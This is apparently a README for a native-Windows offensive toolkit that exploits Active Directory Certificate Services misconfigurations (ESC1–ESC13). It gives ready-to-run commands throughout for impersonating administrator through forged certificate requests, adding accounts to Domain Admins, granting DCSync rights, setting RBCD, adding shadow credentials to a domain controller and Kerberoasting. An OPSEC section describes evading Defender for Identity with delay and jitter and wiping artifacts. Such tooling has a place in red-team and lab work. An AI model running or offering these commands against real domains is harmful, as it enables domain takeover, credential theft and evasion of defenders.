# AD CS LOLBAS Toolkit

Native Windows toolkit for AD CS enumeration and exploitation. Everything runs through built-in OS components (certreq.exe, certutil.exe, PowerShell AD module, .NET Framework) - no third-party tools needed. Build with a sprinkle of FAFO and some finding out in lab env.

## Demo

<video src="./2026-02-08_21-09-05.mp4" width="320" height="240" controls></video>

## Requirements

- Windows domain-joined machine (for live enumeration/exploitation)
- PowerShell 5.1+
- RSAT AD PowerShell module (`Install-WindowsFeature RSAT-AD-PowerShell` on Server, or `Add-WindowsCapability -Online -Name Rsat.ActiveDirectory.DS-LDS.Tools~~~~0.0.1.0` on Win10/11) - not required for snapshot or remote modes
- Domain user context (most scripts work with standard user privileges)
- Snapshot audit (`Invoke-SnapshotAudit.ps1`) works fully offline with no domain connectivity or RSAT

All ESC scripts and utilities dot-source `adcs-common.ps1` for shared helpers (cert requests, auth, UI). Keep it in the same directory as the other scripts.

## Layout

```
LOLADCS/
  README.md
  scripts/
    adcs-common.ps1
    Invoke-Enumerate.ps1
    Invoke-SnapshotAudit.ps1
    Invoke-RemoteAudit.ps1
    Invoke-ESC1.ps1 .. Invoke-ESC13.ps1
    Invoke-FindTemplates.ps1
    Invoke-PassTheCert.ps1
    Invoke-ShadowCredentials.ps1
    Invoke-Kerberoast.ps1
    Invoke-DomainRecon.ps1
```

Run everything from inside the `scripts/` directory.

## Scripts

### Enumeration

**Invoke-Enumerate.ps1** - Scans for ESC1 through ESC13 conditions across templates, CA config, HTTP endpoints, and certificate binding enforcement. Outputs ready-to-run exploitation commands with discovered template names.

```powershell
.\Invoke-Enumerate.ps1
.\Invoke-Enumerate.ps1 -SkipHTTP          # skip ESC8 HTTP probes (quieter)
```

**Invoke-SnapshotAudit.ps1** - Offline AD CS audit against ADExplorer `.dat` snapshots. Parses the binary snapshot format directly (no external dependencies, no domain connectivity). Checks for ESC1, ESC2, ESC3, ESC4, ESC9, and ESC13. Enumerates high-value target groups (Domain Admins, Enterprise Admins, etc.) and generates ready-to-run `Invoke-ESC*` commands.

```powershell
# Full audit
.\Invoke-SnapshotAudit.ps1 -SnapshotPath .\snapshot.dat

# Vulnerable templates only
.\Invoke-SnapshotAudit.ps1 -SnapshotPath .\snapshot.dat -VulnerableOnly

# Interactive mode - pick a target from discovered Domain Admins
.\Invoke-SnapshotAudit.ps1 -SnapshotPath .\snapshot.dat -List

# Specify target user for commands
.\Invoke-SnapshotAudit.ps1 -SnapshotPath .\snapshot.dat -Target administrator

# Export to files
.\Invoke-SnapshotAudit.ps1 -SnapshotPath .\snapshot.dat -OutputFile report.txt -CsvFile results.csv
```

| Parameter | Description |
|-----------|-------------|
| `-SnapshotPath` | Path to ADExplorer `.dat` snapshot file |
| `-VulnerableOnly` | Only show templates with ESC findings |
| `-List` | Interactive target picker - shows HVT members, prompts to select one |
| `-Target` | Specify target user for exploitation commands |
| `-OutputFile` | Save full report as text file |
| `-CsvFile` | Export structured results as CSV |

**Invoke-FindTemplates.ps1** - Lists certificate templates with enrolment permissions, EKUs, and vulnerability flags.

```powershell
.\Invoke-FindTemplates.ps1
.\Invoke-FindTemplates.ps1 -VulnerableOnly
.\Invoke-FindTemplates.ps1 -Identity "Domain Users" -Enrollable
```

**Invoke-DomainRecon.ps1** - 10-stage domain reconnaissance: domain info, password policy, privileged accounts, Kerberos targets, delegation, trusts, GPOs, interesting accounts, computers, and AD CS overview. Saves a text report.

```powershell
.\Invoke-DomainRecon.ps1
.\Invoke-DomainRecon.ps1 -Quick                     # skip slow checks
.\Invoke-DomainRecon.ps1 -Delay 3000 -Jitter 50     # 3s +/- 50% between stages
```

### ESC Exploitation

Each ESC script follows the same pattern: reconnaissance, certificate request, verification, then pass-the-cert authentication. Common parameters across most scripts:

| Parameter | Description |
|-----------|-------------|
| `-CAConfig` | CA config string, e.g. `"polaris.zsec.red\corp-DC01-CA"` |
| `-TemplateName` | Vulnerable template name |
| `-TargetUPN` | UPN to impersonate, e.g. `"administrator@zsec.red"` |
| `-PFXPassword` | PFX export password (auto-generated if omitted) |
| `-OutputDir` | Artifact output directory (default: `$env:TEMP\adcs-ops`) |
| `-AuthMethod` | `Schannel`, `PKINIT`, or `Both` (default) |
| `-DCTarget` | DC FQDN (auto-detected if omitted) |
| `-SkipAuth` | Skip the authentication stage, just get the cert |

**Invoke-ESC1.ps1** - Enrollee supplies subject. Requests a cert with an attacker-specified SAN.

```powershell
.\Invoke-ESC1.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "VulnTemplate" -TargetUPN "administrator@zsec.red"
```

**Invoke-ESC2.ps1** - Any Purpose or No EKU template abuse.

```powershell
.\Invoke-ESC2.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "AnyPurpose"
```

**Invoke-ESC3.ps1** - Enrolment agent chain. Gets an agent cert, then requests on behalf of another user.

```powershell
.\Invoke-ESC3.ps1 -CAConfig "polaris.zsec.red\corp-CA" -AgentTemplate "EnrollmentAgent" -TargetTemplate "User" -TargetUPN "administrator@zsec.red"
```

**Invoke-ESC4.ps1** - Template ACL abuse. Temporarily modifies a template to enable ESC1 conditions, requests a cert, then restores the original config.

```powershell
.\Invoke-ESC4.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "WritableTemplate" -TargetUPN "administrator@zsec.red"
```

**Invoke-ESC5.ps1** - PKI object ACL audit. Read-only check of ACLs on PKI containers.

```powershell
.\Invoke-ESC5.ps1
```

**Invoke-ESC6.ps1** - Exploits the `EDITF_ATTRIBUTESUBJECTALTNAME2` flag on the CA.

```powershell
.\Invoke-ESC6.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "User" -TargetUPN "administrator@zsec.red"
```

**Invoke-ESC7a.ps1** - ManageCA privilege to enable the ESC6 flag, then exploit it.

```powershell
.\Invoke-ESC7a.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "User" -TargetUPN "administrator@zsec.red"
```

**Invoke-ESC7b.ps1** - ManageCertificates privilege to self-approve a pending request.

```powershell
.\Invoke-ESC7b.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "User" -TargetUPN "administrator@zsec.red"
```

**Invoke-ESC8.ps1** / **Invoke-ESC11.ps1** - Discovery-only scripts for HTTP (ESC8) and RPC (ESC11) relay endpoints. Actual relay requires external tooling (ntlmrelayx).

```powershell
.\Invoke-ESC8.ps1
.\Invoke-ESC11.ps1
```

**Invoke-ESC9.ps1** - No security extension with UPN manipulation. Requires write access to a controlled account's UPN.

```powershell
.\Invoke-ESC9.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "NoSecExt" -AccountToModify "controlleduser" -TargetUPN "administrator@zsec.red"
```

**Invoke-ESC10a.ps1** - Weak certificate binding (enforcement disabled).

```powershell
.\Invoke-ESC10a.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "WeakBinding" -AccountToModify "controlleduser" -TargetUPN "administrator@zsec.red"
```

**Invoke-ESC10b.ps1** - Weak binding with compatibility mode and no-UPN machine account.

```powershell
.\Invoke-ESC10b.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "WeakBinding" -MachineAccount "YOURPC$" -TargetUPN "administrator@zsec.red"
```

**Invoke-ESC12.ps1** - YubiHSM key recovery check (read-only).

```powershell
.\Invoke-ESC12.ps1
```

**Invoke-ESC13.ps1** - OID group link abuse. Exploits issuance policies linked to AD groups.

```powershell
.\Invoke-ESC13.ps1 -CAConfig "polaris.zsec.red\corp-CA" -TemplateName "OIDLinkedTemplate"
```

### Post-Exploitation

**Invoke-PassTheCert.ps1** - Authenticates to LDAP using a PFX certificate and performs post-exploitation operations. Includes an interactive LDAP shell with 70+ commands.

```powershell
# Verify identity
.\Invoke-PassTheCert.ps1 -PFXFile cert.pfx -PFXPassword "pass" -Action Whoami

# Interactive LDAP shell
.\Invoke-PassTheCert.ps1 -PFXFile cert.pfx -PFXPassword "pass" -Action LdapShell

# Direct actions
.\Invoke-PassTheCert.ps1 -PFXFile cert.pfx -PFXPassword "pass" -Action AddGroupMember -TargetDN "CN=Domain Admins,CN=Users,DC=zsec,DC=red" -PrincipalDN "CN=jsmith,CN=Users,DC=zsec,DC=red"
.\Invoke-PassTheCert.ps1 -PFXFile cert.pfx -PFXPassword "pass" -Action SetRBCD -TargetDN "CN=SERVER$,CN=Computers,DC=zsec,DC=red" -PrincipalDN "CN=ATTACKER$,CN=Computers,DC=zsec,DC=red"
.\Invoke-PassTheCert.ps1 -PFXFile cert.pfx -PFXPassword "pass" -Action ResetPassword -TargetDN "CN=victim,CN=Users,DC=zsec,DC=red"
.\Invoke-PassTheCert.ps1 -PFXFile cert.pfx -PFXPassword "pass" -Action ReadGMSA -TargetDN "svc_account$"
.\Invoke-PassTheCert.ps1 -PFXFile cert.pfx -PFXPassword "pass" -Action ShadowCred -TargetDN "DC01$"
```

LdapShell commands include: `user`, `group`, `computer`, `admins`, `das`, `eas`, `spns`, `asrep`, `unconstrained`, `constrained`, `delegations`, `rbcd`, `gmsa`, `laps`, `trusts`, `gpos`, `ous`, `templates`, `cas`, `enrollcheck`, `kerberoast`, `acl`, `servicemap`, `dnsrecords`, and action commands like `adduser`, `addda`, `addcomputer`, `passwd`, `addmember`, `shadowcred`, `setrbcd`, `setdcsync`, `writedacl`, `dnsadd`, and more. Type `help` in the shell for the full list.

**Invoke-ShadowCredentials.ps1** - Standalone shadow credentials attack using the current user's domain context (no certificate needed). Adds, lists, or removes `msDS-KeyCredentialLink` values.

```powershell
.\Invoke-ShadowCredentials.ps1 -Target "DC01$" -Action Add
.\Invoke-ShadowCredentials.ps1 -Target "DC01$" -Action List
.\Invoke-ShadowCredentials.ps1 -Target "DC01$" -Action Remove -DeviceId "a1b2c3d4-..."
.\Invoke-ShadowCredentials.ps1 -Target "DC01$" -Action Clear
```

**Invoke-Kerberoast.ps1** - Native Kerberoast via `System.IdentityModel`. Discovers kerberoastable accounts and requests TGS tickets. Outputs in hashcat format.

```powershell
.\Invoke-Kerberoast.ps1
.\Invoke-Kerberoast.ps1 -AdminOnly
.\Invoke-Kerberoast.ps1 -Target "MSSQLSvc/db01.zsec.red:1433"
.\Invoke-Kerberoast.ps1 -Delay 2000 -Jitter 50     # 2s +/- 50% between requests
```

## OPSEC Notes

Several scripts support options to reduce detection footprint:

- **`-Delay` / `-Jitter`** on Kerberoast and DomainRecon adds random sleep between operations to avoid rate-based detection (MDI, etc.)
- **`delay` command** in LdapShell does the same for interactive queries
- **`-SkipHTTP`** on Enumerate avoids network connections to CA web endpoints
- **`cleanup`** in LdapShell removes temp artifacts from `%TEMP%` (PFX files, hashes, reports)
- **ESC7 check** in Enumerate now uses LDAP instead of `certutil -getreg` where possible. ESC6 and ESC11 still require `certutil` (registry values with no LDAP equivalent)
- Shadow credential commands always print cleanup reminders with the exact removal command

Artifacts are written to `%TEMP%\adcs-ops\` by default. Clean up after yourself.

## File Reference

All scripts live in `scripts/`.

| File | Purpose |
|------|---------|
| `adcs-common.ps1` | Shared helpers - dot-sourced by all other scripts |
| `Invoke-Enumerate.ps1` | ESC1-13 vulnerability scanner |
| `Invoke-SnapshotAudit.ps1` | Offline ADExplorer snapshot audit (ESC1-4, 9, 13) |
| `Invoke-RemoteAudit.ps1` | Remote LDAP audit (no RSAT needed) |
| `Invoke-FindTemplates.ps1` | Template discovery and filtering |
| `Invoke-DomainRecon.ps1` | Comprehensive domain reconnaissance |
| `Invoke-ESC[1-13].ps1` | Individual ESC exploitation scripts |
| `Invoke-PassTheCert.ps1` | Certificate-based LDAP auth + interactive shell |
| `Invoke-ShadowCredentials.ps1` | Shadow credentials (standalone, no cert needed) |
| `Invoke-Kerberoast.ps1` | Native TGS ticket extraction |
